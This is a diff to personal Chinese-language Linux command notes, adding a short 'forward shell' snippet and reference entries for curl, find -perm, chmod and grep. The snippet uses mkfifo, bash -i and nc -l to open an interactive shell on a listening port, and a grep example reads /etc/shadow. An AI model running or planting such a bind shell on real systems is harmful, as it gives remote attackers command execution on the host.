@@ -4,6 +4,17 @@
 
  nc -FNlp 80  < 2.txt
 
+### 正向shell
+
+```
+mkfifo /tmp/fifo
+cat /tmp/fifo | /bin/bash -i 2>&1 | nc -l 10000 > /tmp/fifo
+```
+
+
+
+
+
 ## find
 
 ### 语法
@@ -323,4 +334,339 @@ With no FILE, or when FILE is -, read standard input.
 ### 删除别名 unalias
 
 unalias 'cat'
+
+
+
+## curl
+
+ https://www.ruanyifeng.com/blog/2019/09/curl-reference.html 
+
+### get请求
+
+
+
+####   **-G**
+
+`-G`参数用来构造 URL 的查询字符串。
+
+> ```bash
+> $ curl -G -d 'q=kitties' -d 'count=20' https://google.com/search
+> ```
+
+上面命令会发出一个 GET 请求，实际请求的 URL 为`https://google.com/search?q=kitties&count=20`。如果省略`--G`，会发出一个 POST 请求。
+
+如果数据需要 URL 编码，可以结合`--data--urlencode`参数。
+
+> ```bash
+> $ curl -G --data-urlencode 'comment=hello world' https://www.example.com
+> ```
+
+### post请求
+
+
+
+#### -d
+
+`-d`参数用于发送 POST 请求的数据体。
+
+> ```bash
+> $ curl -d'login=emma＆password=123'-X POST https://google.com/login
+> # 或者
+> $ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login
+> ```
+
+使用`-d`参数以后，HTTP 请求会自动加上标头`Content-Type : application/x-www-form-urlencoded`。并且会自动将请求转为 POST 方法，因此可以省略`-X POST`。
+
+`-d`参数可以读取本地文本文件的数据，向服务器发送。
+
+> ```bash
+> $ curl -d '@data.txt' https://google.com/login
+> ```
+
+上面命令读取`data.txt`文件的内容，作为数据体向服务器发送。
+
+####  **--data-urlencode**
+
+`--data-urlencode`参数等同于`-d`，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。
+
+> ```bash
+> $ curl --data-urlencode 'comment=hello world' https://google.com/login
+> ```
+
+上面代码中，发送的数据`hello world`之间有一个空格，需要进行 URL 编码。
+
+### 修改指定http头
+
+`-e`参数用来设置 HTTP 的标头`Referer`，表示请求的来源。
+
+> ```bash
+> curl -e 'https://google.com?q=example' https://www.example.com
+> ```
+
+上面命令将`Referer`标头设为`https://google.com?q=example`。
+
+`-H`参数可以通过直接添加标头`Referer`，达到同样效果。
+
+> ```bash
+> curl -H 'Referer: https://google.com?q=example' https://www.example.com
+> ```
+
+### 设置和接受cookie
+
+#### -b
+
+`-b`参数用来向服务器发送 Cookie。
+
+> ```bash
+> $ curl -b 'foo=bar' https://google.com
+> ```
+
+上面命令会生成一个标头`Cookie: foo=bar`，向服务器发送一个名为`foo`、值为`bar`的 Cookie。
+
+> ```bash
+> $ curl -b 'foo1=bar' -b 'foo2=baz' https://google.com
+> ```
+
+上面命令发送两个 Cookie。
+
+> ```bash
+> $ curl -b cookies.txt https://www.google.com
+> ```
+
+上面命令读取本地文件`cookies.txt`，里面是服务器设置的 Cookie（参见`-c`参数），将其发送到服务器。
+
+#### -c
+
+`-c`参数将服务器设置的 Cookie 写入一个文件。
+
+> ```bash
+> $ curl -c cookies.txt https://www.google.com
+> ```
+
+上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件`cookies.txt`。
+
+### 设置代理
+
+####  **-x**
+
+`-x`参数指定 HTTP 请求的代理。
+
+> ```bash
+> $ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com
+> ```
+
+上面命令指定 HTTP 请求通过`myproxy.com:8080`的 socks5 代理发出。
+
+如果没有指定代理协议，默认为 HTTP。
+
+> ```bash
+> $ curl -x james:cats@myproxy.com:8080 https://www.example.com
+> ```
+
+上面命令中，请求的代理使用 HTTP 协议。
+
+
+
+## find
+
+### 根据权限查找文件
+
+#### -perm mode
+
+mode 可以是代表权限的八进制数字（777、666 …）也可以是权限符号（u=x，a=r+x）。
+
+在深入之前，我们就以下三点详细说明 mode 参数。
+
+1. 如果我们不指定任何参数前缀，它将会寻找**具体**权限的文件。
+2. 如果我们使用 `-` 参数前缀， 寻找到的文件至少拥有 mode 所述的权限，而不是具体的权限（大于或等于此权限的文件都会被查找出来）。
+3. 如果我们使用 `/` 参数前缀，那么所有者、组或者其他人任意一个应当享有此文件的权限。
+
+### 基于符号的文件权限查找文件
+
+在下面的例子中，我们使用例如 `u`（所有者）、`g`（用户组） 和 `o`（其他） 的符号表示法。我们也可以使用字母 `a` 代表上述三种类型。我们可以通过特指的 `r` （读）、 `w` （写）、 `x` （执行）分别代表它们的权限。
+
+例如，寻找用户组中拥有 `写` 权限的文件，执行：
+
+```shell
+find -perm -g=w
+```
+
+你可以等效使用 `=` 或 `+` 两种符号标识。例如，下列两行相同效果的代码。
+
+```
+find -perm -g=w
+find -perm -g+w
+```
+
+查找文件所有者中拥有写权限的文件，执行：
+
+```
+find -perm -u=w
+```
+
+查找所有用户中拥有写权限的文件，执行：
+
+```
+find -perm -a=w
+```
+
+查找所有者和用户组中同时拥有写权限的文件，执行：
+
+```
+find -perm -g+w,u+w
+```
+
+上述命令等效与 `find -perm -220`。
+
+查找所有者或用户组中拥有写权限的文件，执行：
+
+```
+find -perm /u+w,g+w
+```
+
+或者,
+
+```
+find -perm /u=w,g=w
+```
+
+上述命令等效于 `find -perm /220`。
+
+
+
+### -type指定类型
+
+ f 普通文件
+l 符号连接
+d 目录
+c 字符设备
+b 块设备
+s 套接字
+p Fifo 
+
+`-type f` 文件
+
+`-type d`目录
+
+
+
+### 指定所有用户或组
+
+找出当前目录用户tom拥有的所有文件 `find . -type f -user tom`
+
+ 找出当前目录用户组sunk拥有的所有文件` find . -type f -group sunk`
+
+
+
+### -exec 对找到的内容执行命令
+
+`find -perm -o=rwx -type d -exec ls {} \; `
+
+注意`\`和`}`之间的空格
+
+
+
+## chmod
+
+**chmod命令**用来变更文件或目录的权限。在UNIX系统家族里，文件或目录权限的控制分别以读取、写入、执行3种一般权限来区分，另有3种特殊权限可供运用。用户可以使用chmod指令去变更文件与目录的权限，设置方式采用文字或数字代号皆可。符号连接的权限无法变更，如果用户对符号连接修改权限，其改变会作用在被连接的原始文件。
+
+权限范围的表示法如下：
+
+`u` User，即文件或目录的拥有者；
+`g` Group，即文件或目录的所属群组；
+`o` Other，除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围；
+`a` All，即全部的用户，包含拥有者，所属群组以及其他用户；
+`r` 读取权限，数字代号为“4”;
+`w` 写入权限，数字代号为“2”；
+`x` 执行或切换权限，数字代号为“1”；
+`-` 不具任何权限，数字代号为“0”；
+`s` 特殊功能说明：变更文件或目录的权限。
+
+### 语法 
+
+```
+chmod(选项)(参数)
+```
+
+### 选项 
+
+```
+-c或——changes：效果类似“-v”参数，但仅回报更改的部分；
+-f或--quiet或——silent：不显示错误信息；
+-R或——recursive：递归处理，将指令目录下的所有文件及子目录一并处理；
+-v或——verbose：显示指令执行过程；
+--reference=<参考文件或目录>：把指定文件或目录的所属群组全部设成和参考文件或目录的所属群组相同；
+<权限范围>+<权限设置>：开启权限范围的文件或目录的该选项权限设置；
+<权限范围>-<权限设置>：关闭权限范围的文件或目录的该选项权限设置；
+<权限范围>=<权限设置>：指定权限范围的文件或目录的该选项权限设置；
+```
+
+
+
+## grep
+
+格式
+
+       grep [OPTIONS] PATTERN [FILE...]
+       grep [OPTIONS] -e PATTERN ... [FILE...]
+       grep [OPTIONS] -f FILE ... [FILE...]
+
+
+ 当命令匹配到执行命令时指定的模式时，grep会将包含模式的一行输出，但是并不对原文件内容进行修改。 
+
+
+
+
+
+### -l 显示匹配文件文件内容的文件名
+
+```shell
+grep -l linuxtechi /etc/passwd /etc/shadow /etc/fstab /etc/mtab
+/etc/passwd
+/etc/shadow
+```
+
+
+
+### -n 在文件中查找指定模式并显示匹配行的行号
+
+
+
+###  -v 输出不包含指定模式的行
+
+
+
+### -r 递归地查找特定模式
+
+` grep -r linuxtechi /etc/ `
+
+ 上面的命令将会递归的在/etc目录中查找“linuxtechi”单词 
+
+
+
+### -i 忽略字符大小写
+
+
+
+### -e 查找多个模式
+
+例如我想在日志里查找带GET或者POST请求的时候
+
+输入`grep  -e"GET" -e "POST"`
+
+###  -B 输出匹配行的前n行
+
+
+
+###  -A 输出匹配行的后n行
+
+
+
+### -C 查看搜索结果前后N行
+
+
+
+### -f 指定某个文件的内容作为搜索参数
+
+
 
